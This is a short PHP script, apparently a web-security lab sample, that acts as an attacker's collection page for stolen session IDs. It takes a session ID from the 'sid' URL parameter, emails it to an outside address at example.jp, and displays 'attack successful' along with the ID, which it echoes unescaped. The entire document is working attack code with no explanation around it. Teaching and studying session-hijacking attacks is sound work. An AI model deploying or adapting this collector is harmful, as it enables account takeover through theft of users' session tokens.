<?php
  mb_language('Japanese');
  $sid = $_GET['sid'];
  mb_send_mail('wasbook@example.jp', '攻击成功', 'Session ID:' . $sid,
    'From: cracked@trap.example.com');
?>
<body>攻击成功<br>
<?php echo $sid; ?>
</body>
